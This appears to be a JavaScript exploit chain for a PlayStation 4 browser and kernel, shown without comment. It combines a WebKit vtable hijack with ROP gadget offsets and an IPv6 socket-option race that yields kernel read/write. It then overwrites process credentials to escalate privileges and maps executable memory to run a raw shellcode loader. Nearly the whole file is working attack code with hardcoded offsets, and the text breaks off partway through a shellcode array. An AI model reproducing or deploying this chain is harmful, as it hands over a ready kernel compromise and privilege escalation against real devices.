var p;
var chain;

var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_wk_vtable_first_element = 0x7D3600;
const OFFSET_WK_memset_import = 0x228;
const OFFSET_WK___stack_chk_fail_import = 0xC8;
const OFFSET_WK_setjmp_gadget = 0x1438C73;
const OFFSET_WK_longjmp_gadget = 0x13D98EE;
const OFFSET_WK_longjmp_gadget_thread = 0x15C609B;



const OFFSET_libcint_memset = 0x225E0;
const OFFSET_libcint_setjmp = 0x8AE2C;
const OFFSET_libcint_longjmp = 0x8AEA8;

const OFFSET_lk___stack_chk_fail = 0x11EC0;
const OFFSET_lk_pthread_create_name_np = 0x1A8C0;
const OFFSET_lk_pthread_exit = 0x18E80;
const OFFSET_lk___error = 0x155A0;

var syscalls = {};
var gadgets = {};
var gadgetmap = {
    "ret": 0x0000003C,
    "pop rdi": 0x00038DBA,
    "pop rsi": 0x0008F38A,
    "pop rdx": 0x001BE024,
    "pop rcx": 0x00052E59,
    "pop r8": 0x000179C5,
    "pop r9": 0x00BB320F,
    "pop rax": 0x000043F5,
    "pop rsp": 0x0001E687,

    "mov [rdi], rax": 0x003ADAEB,
    "mov [rdi], eax": 0x10EE8,
    "mov [rdi], rsi": 0x00023AC2,
    "infloop": 0x01545EAA,
    "mov [rdi], eax": 0x795257,
    "mov rax, r8": 0x2A3B02,

    "cmp [rcx], edi": 0x2B74A86,
    "setne al": 0x5723,
    "sete al": 0xDB7B,
    "setle al": 0xC0184,
    "setl al": 0x38166,
    "setge al": 0x64F25D,
    "setg al": 0x5A424,
    "shl rax, 3": 0x57EF96,
    "add rax, rdx": 0x00209A03,
    "mov rax, [rax]": 0x0006C83A,
    "inc [r9]": 0xE48CC3,
};

//create target textarea to gain execution
var textArea = document.createElement("textarea");

function stage2() {
    p = window.prim;
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;

    //pointer to vtable
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    var textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    for (var gadget in gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(8), size);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }
    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1F8), webKitBase.add32(OFFSET_WK_setjmp_gadget)); // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];

    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1F8), webKitBase.add32(OFFSET_WK_longjmp_gadget)); //mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 

    function launch_chain(chain) {

        chain.push(window.gadgets["pop rdx"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;

        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);

        p.write8(textAreaVtPtr, fakeVtable_longjmp);

        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }



    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;
    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);

    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();
    if(chain.syscall(23, 0).low == 0x0) {
        var payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x41000, -1, 0);
        var payload_loader = p.malloc32(0x1000);

        var loader_writer = payload_loader.backing;
        loader_writer[0] = 0x56415741;
        loader_writer[1] = 0x83485541;
        loader_writer[2] = 0x894818EC;
        loader_writer[3] = 0xC748243C;
        loader_writer[4] = 0x10082444;
        loader_writer[5] = 0x483C2302;
        loader_writer[6] = 0x102444C7;
        loader_writer[7] = 0x00000000;
        loader_writer[8] = 0x000002BF;
        loader_writer[9] = 0x0001BE00;
        loader_writer[10] = 0xD2310000;
        loader_writer[11] = 0x00009CE8;
        loader_writer[12] = 0xC7894100;
        loader_writer[13] = 0x8D48C789;
        loader_writer[14] = 0xBA082474;
        loader_writer[15] = 0x00000010;
        loader_writer[16] = 0x000095E8;
        loader_writer[17] = 0xFF894400;
        loader_writer[18] = 0x000001BE;
        loader_writer[19] = 0x0095E800;
        loader_writer[20] = 0x89440000;
        loader_writer[21] = 0x31F631FF;
        loader_writer[22] = 0x0062E8D2;
        loader_writer[23] = 0x89410000;
        loader_writer[24] = 0x2C8B4CC6;
        loader_writer[25] = 0x45C64124;
        loader_writer[26] = 0x05EBC300;
        loader_writer[27] = 0x01499848;
        loader_writer[28] = 0xF78944C5;
        loader_writer[29] = 0xBAEE894C;
        loader_writer[30] = 0x00001000;
        loader_writer[31] = 0x000025E8;
        loader_writer[32] = 0x7FC08500;
        loader_writer[33] = 0xFF8944E7;
        loader_writer[34] = 0x000026E8;
        loader_writer[35] = 0xF7894400;
        loader_writer[36] = 0x00001EE8;
        loader_writer[37] = 0x2414FF00;
        loader_writer[38] = 0x18C48348;
        loader_writer[39] = 0x5E415D41;
        loader_writer[40] = 0x31485F41;
        loader_writer[41] = 0xC748C3C0;
        loader_writer[42] = 0x000003C0;
        loader_writer[43] = 0xCA894900;
        loader_writer[44] = 0x48C3050F;
        loader_writer[45] = 0x0006C0C7;
        loader_writer[46] = 0x89490000;
        loader_writer[47] = 0xC3050FCA;
        loader_writer[48] = 0x1EC0C748;
        loader_writer[49] = 0x49000000;
        loader_writer[50] = 0x050FCA89;
        loader_writer[51] = 0xC0C748C3;
        loader_writer[52] = 0x00000061;
        loader_writer[53] = 0x0FCA8949;
        loader_writer[54] = 0xC748C305;
        loader_writer[55] = 0x000068C0;
        loader_writer[56] = 0xCA894900;
        loader_writer[57] = 0x48C3050F;
        loader_writer[58] = 0x006AC0C7;
        loader_writer[59] = 0x89490000;
        loader_writer[60] = 0xC3050FCA;

        chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));

        var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
            new_thr.push(window.gadgets["pop rdi"]);
            new_thr.push(payload_buffer);
            new_thr.push(payload_loader);
            new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
        });
        loader_thr();
        awaitpl();
    }
    else {
        stage3();
    }
}

function stage3() {
    const errno_location = chain.call(libKernelBase.add32(OFFSET_lk___error));

    const AF_INET6 = 28;
    const SOCK_DGRAM = 2;
    const IPPROTO_UDP = 17;
    const IPPROTO_IPV6 = 41;
    const IPV6_TCLASS = 61;
    const IPV6_2292PKTOPTIONS = 25;
    const IPV6_RTHDR = 51;
    const IPV6_PKTINFO = 46;

    const SPRAY_TCLASS = 0x53;
    const TAINT_CLASS = 0x58;
    const NANOSLEEP_TIME = 150 * 1000; //150µs
    const TCLASS_MASTER = 0x2AFE0000;

    const PKTOPTS_PKTINFO_OFFSET = 0x10;
    const PKTOPTS_RTHDR_OFFSET = 0x68;
    const PKTOPTS_TCLASS_OFFSET = 0xB0;

    const KNOTE_KN_OFFSET = 0x60;
    const FILE_FOPS_OFFSET = 0x8;
    const FILEOPS_IOCTL_OFFSET = 0x18;
    const THREAD_UCRED_OFFSET = 0x130;

    const KERNEL_M_IP6OPT_OFFSET = 0x14B4160;
    const KERNEL_MALLOC_OFFSET = 0x10E250;
    const KERNEL_FREE_OFFSET = 0x10E460;
    const KERNEL_SOCKETOPS_OFFSET = 0x19D58F0;

    const NUM_SPRAY_SOCKS = 0x100;
    const NUM_LEAK_SOCKS = 0x64;
    const NUM_SLAVE_SOCKS = 0x12C;
    const NUM_KQUEUES = 0x96;

    const size_of_triggered = 0x8;
    const size_of_valid_pktopts = 0x18;
    const size_of_nanosleep = 0x10;
    const size_of_size_of_tclass = 0x8;
    const size_of_master_main_tclass = 0x8;
    const size_of_master_thr1_tclass = 0x8;
    const size_of_master_thr2_tclass = 0x8;
    const size_of_spray_tclass = 0x8;
    const size_of_taint_tclass = 0x8;
    const size_of_tmp_tclass = 0x8;
    const size_of_rthdr_buffer = 0x800;
    const size_of_size_of_rthdr_buffer = 0x8;
    const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
    const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
    const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
    const size_of_kqueues = 0x4 * NUM_KQUEUES;
    const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
    const size_of_pktinfo_buffer = 0x18;
    const size_of_pktinfo_buffer_len = 0x8
    const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
    const size_of_fake_socketops = 0x58;
    const size_of_loop_counter = 0x8;
    const size_of_kevent = 0x20;
    const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_nanosleep + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
        size_of_rthdr_buffer + size_of_size_of_rthdr_buffer + size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_kqueues + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
        size_of_kevent
    );

    const triggered = var_memory;
    const valid_pktopts = triggered.add32(size_of_triggered);
    const nanosleep = valid_pktopts.add32(size_of_valid_pktopts);
    const size_of_tclass = nanosleep.add32(size_of_nanosleep);
    const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
    const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
    const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
    const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
    const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
    const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
    const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
    const size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
    const spray_sockets_ptr = size_of_rthdr_buffer.add32(size_of_size_of_rthdr_buffer);
    const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
    const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
    const kqueues_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
    const spray_socks_tclasses_ptr = kqueues_ptr.add32(size_of_kqueues);
    const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
    const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
    const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
    const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
    const loop_counter = fake_socketops.add32(size_of_fake_socketops);
    const kevent = loop_counter.add32(size_of_loop_counter);

    var overlapped_socket = -1;
    var overlapped_socket_idx = -1;

    var prev_overlapped_socket = -1;
    var prev_overlapped_socket_idx = -1;

    var slave_socket = -1;
    var slave_socket_idx = -1;

    var leaked_kevent_address = 0;
    var leaked_pktopts_address = 0;

    var knote;
    var kevent_file_data;
    var socketops;
    var kernel_base;

    p.write8(valid_pktopts.add32(0x0), 0x14);
    p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
    p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
    p.write4(valid_pktopts.add32(0x10), 0x0);

    for (var i = 0; i < 10; i++) {
        p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
    }
    p.write8(fake_socketops.add32(0x50), 1);

    p.write8(nanosleep.add32(0x0), 0x0);
    p.write8(nanosleep.add32(0x8), NANOSLEEP_TIME);

    p.write8(size_of_tclass, 0x4);
    p.write8(spray_tclass, SPRAY_TCLASS);

    p.write8(master_main_tclass, 0x0);
    p.write8(master_thr1_tclass, 0x0);
    p.write8(master_thr2_tclass, 0x0);

    p.write8(taint_tclass, TAINT_CLASS);
    p.write8(tmp_tclass, 0x10);

    p.write8(pktinfo_buffer_len, 0x14)

    //create sockets
    const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
    const kevent_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
    const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low; 
    const spare_socket2 = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low; 
    const spare_socket3 = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low; 
    
    {

        for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
            chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
        }
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueues_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
    const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);
    const kqueues = p.array_from_address(kqueues_ptr, NUM_KQUEUES);

    p.write8(kevent.add32(0x0), kevent_socket);
    p.write8(kevent.add32(0x8), 0x1FFFF);
    p.write8(kevent.add32(0x10), 5);
    p.write8(kevent.add32(0x18), 0);
    p.write8(errno_location, 0);

    const thread1 = chain.spawn_thread("thread1", function(new_thr) {
        const loop_start = new_thr.get_rsp();
        const trigger_condition = new_thr.create_equal_branch(triggered, 1);

        const triggered_false = new_thr.get_rsp();
        new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
        const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

        const overlap_false = new_thr.get_rsp();
        new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
        new_thr.jmp_rsp(loop_start);

        const overlap_true = new_thr.get_rsp();
        new_thr.push_write8(triggered, 1);

        const triggered_true = new_thr.get_rsp();
        new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

        new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
        new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
    });

    const thread2 = chain.spawn_thread("thread2", function(new_thr) {
        const loop_start = new_thr.get_rsp();
        const trigger_condition = new_thr.create_equal_branch(triggered, 1);

        const triggered_false = new_thr.get_rsp();
        new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
        const overlap_condition = new_thr.create_equal_branch(master_thr2_tclass, SPRAY_TCLASS);

        const overlap_false = new_thr.get_rsp();
        new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        new_thr.syscall_safe(240, nanosleep, 0);
        new_thr.jmp_rsp(loop_start);

        const overlap_true = new_thr.get_rsp();
        new_thr.push_write8(triggered, 1);

        const triggered_true = new_thr.get_rsp();
        new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

        new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
        new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
    });

    const thread3 = new rop();
    //main thread (can't use chain rop for this)
    {
        const loop_start = thread3.get_rsp();
        for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
            thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
        }
        thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
        const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);

        const overlap_false = thread3.get_rsp(); 
        for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
            thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        }
        thread3.syscall_safe(240, nanosleep, 0);
        thread3.jmp_rsp(loop_start);

        const overlap_true = thread3.get_rsp();
        thread3.push_write8(triggered, 1);
        thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
        for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
            thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
        }

        thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }

    thread1();
    thread2();
    thread3.run();

    function find_socket_overlap() {
        for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
            if(spray_socks_tclasses[i] == TAINT_CLASS) {
                overlapped_socket = spray_sockets[i];
                overlapped_socket_idx = i;
                spray_sockets[i] = spare_socket;
                return;
            }
        }
        alert("[ERROR] -> failed to find socket overlap. (should be unreachable)");
        while(1){};
    }
    function fake_pktopts(pktinfo) {
        
        {
            chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
            chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
            chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
            chain.push_write8(loop_counter, 0);
            chain.push_write8(tmp_tclass, 0x0);

            chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

            const loop_start = chain.get_rsp();
            const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

            const loop_condition_false = chain.get_rsp();
            for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
                chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
                chain.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
            }
            chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
            const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

            const overlap_false = chain.get_rsp();
            chain.push(window.gadgets["pop r9"]);
            chain.push(loop_counter);
            chain.push(window.gadgets["inc [r9]"]);
            chain.jmp_rsp(loop_start);

            const loop_condition_true = chain.get_rsp();
            const overlap_true = chain.get_rsp();

            chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
            chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
        } chain.run();

        const tclass = p.read4(tmp_tclass);
        if((tclass & 0xFFFF0000) == TCLASS_MASTER) {
            prev_overlapped_socket = overlapped_socket;
            prev_overlapped_socket_idx = overlapped_socket_idx;

            overlapped_socket_idx = (tclass & 0x0000FFFF);
            overlapped_socket = spray_sockets[overlapped_socket_idx];
            return;
        }
        alert("[ERROR] failed to find RTHDR <-> master socket overlap");
        while(1){};

    }
    function leak_rthdr_address(size) {
        const ip6r_len = ((size >> 3) -1 & ~1);
        const ip6r_segleft = (ip6r_len >> 1);
        const header = (ip6r_len << 8) + (ip6r_segleft << 24);
        {
            chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
            chain.push_write8(rthdr_buffer, header);
            chain.push_write8(size_of_rthdr_buffer, size);
            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
            chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, size_of_rthdr_buffer);
        } chain.run();
        const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
        return kaddress;
    }
    function leak_addresses() {
        {
            for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
                chain.fcall(syscalls[105], spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
            }
        } chain.run();
        leaked_kevent_address = leak_rthdr_address(0x800);
        {
            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
            for(var i = 0; i < NUM_KQUEUES; i++) {
                chain.fcall(window.syscalls[363], kqueues[i], kevent, 1, 0, 0, 0);
            }
        } chain.run();
        leaked_pktopts_address = leak_rthdr_address(0x100);
        {
            chain.push_write8(tmp_tclass, 0x10);
            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
            for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
                chain.fcall(syscalls[105], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
            }
        } chain.run();
        return;
    }
    function find_slave() {
        {
            chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
            chain.push_write8(pktinfo_buffer.add32(0x8), 0);
            chain.push_write8(pktinfo_buffer.add32(0x10), 0);
            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
            for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
                chain.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
            }
        } chain.run();

        for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
            if(p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
                slave_socket = spray_sockets[i];
                slave_socket_idx = i;
                return;
            }
        }
        alert("[ERROR] failed to find slave");
        while(1){};
    }
    function kernel_read8(address) {
        {
            chain.push_write8(pktinfo_buffer, address);
            chain.push_write8(pktinfo_buffer.add32(0x8), 0);
            chain.push_write8(pktinfo_buffer.add32(0x10), 0);
            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
            chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
        } chain.run();
        return p.read8(pktinfo_buffer);
    }
    function kernel_write8(address, value) {
        {
            chain.push_write8(pktinfo_buffer, address);
            chain.push_write8(pktinfo_buffer.add32(0x8), 0);
            chain.push_write8(pktinfo_buffer.add32(0x10), 0);
            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
            chain.syscall(118, slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
            chain.push_write8(pktinfo_buffer, value);
            chain.syscall(105, slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
        } chain.run();
    }

    function find_knote() {
        for(var i = 0; i < 0x20; i++) {
            knote = kernel_read8(leaked_kevent_address.add32(0x8 * kevent_socket + 0x800 * i));
            if(knote.hi != leaked_kevent_address.hi) {continue;}

            kevent_file_data = kernel_read8(knote.add32(KNOTE_KN_OFFSET));
            if(kevent_file_data.hi != leaked_kevent_address.hi) {continue;}

            socketops = kernel_read8(kevent_file_data.add32(FILE_FOPS_OFFSET));
            if(socketops.hi != 0xFFFFFFFF) {continue;}

            kernel_base = socketops.sub32(KERNEL_SOCKETOPS_OFFSET);
            if(kernel_base.hi != 0xFFFFFFFF || (kernel_base.low & 0x3FFF) != 0) {continue;}
            return i;
        }
        for(var i = 1; i < 0x21; i++) {
            knote = kernel_read8(leaked_kevent_address.sub32(0x800 * i).add32(0x8 * kevent_socket));
            if(knote.hi != leaked_kevent_address.hi) {continue;}

            kevent_file_data = kernel_read8(knote.add32(KNOTE_KN_OFFSET));
            if(kevent_file_data.hi != leaked_kevent_address.hi) {continue;}

            socketops = kernel_read8(kevent_file_data.add32(FILE_FOPS_OFFSET));
            if(socketops.hi != 0xFFFFFFFF) {continue;}

            kernel_base = socketops.sub32(KERNEL_SOCKETOPS_OFFSET);
            if(kernel_base.hi != 0xFFFFFFFF || (kernel_base.low & 0x3FFF) != 0) {continue;}
            return -i;
        }
        alert("[ERROR] failed to find knote");
        while(1){};
    }
    
    find_socket_overlap();
    for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
        chain.fcall(syscalls[105], spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
    }
    fake_pktopts(0);
    spray_sockets[overlapped_socket_idx] = spare_socket2;
    leak_addresses();
    fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
    find_slave();
    //Kernel R/W
    const knote_idx = find_knote();

    p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), window.gadgets["mov rax, r8"]);
    kernel_write8(kevent_file_data.add32(FILE_FOPS_OFFSET), fake_socketops);
    chain.syscall(54, kevent_socket, 0x20005353, 0);
    const thread_pointer_low = p.read8(errno_location).low;
    const thread_pointer = new int64(thread_pointer_low, leaked_pktopts_address.hi);
    const thread_ucred = kernel_read8(thread_pointer.add32(THREAD_UCRED_OFFSET));
    kernel_write8(thread_ucred.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF));
    kernel_write8(thread_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));

    var exec_handle = chain.syscall(533, 0, 0x100000, 7);
    var write_handle = chain.syscall(534, exec_handle, 3);
    var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
    var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
    chain.syscall(324, 1);
    if(exec_address.low != 0x90000000) {
        alert("[ERROR] failed to allocate jit memory");
        while(1){};
    }
    var exec_writer = p.array_from_address(write_address, 0x4000);
    for(var i = 0; i < 0x200; i++) {
        exec_writer[i] = 0x90909090;
    }
    exec_writer[0x200] = 0x37C0C748;
    exec_writer[0x201] = 0xC3000013;
    if(chain.call(exec_address).low != 0x1337) {
        alert("[ERROR] hmm weird");
        while(1){};
    }

    exec_writer[0] = 0x08408B49;
    exec_writer[1] = 0x48408B48;
    exec_writer[2] = 0xBF008B48;
    exec_writer[3] = 0x11111111;
    exec_writer[4] = 0xF83C8B48;
    exec_writer[5] = 0x483F8B48;
    exec_writer[6] = 0x48187F8B;
    exec_writer[7] = 0x011887C7;
    exec_writer[8] = 0x00000000;
    exec_writer[9] = 0x22BF0000;
    exec_writer[10] = 0x48222222;
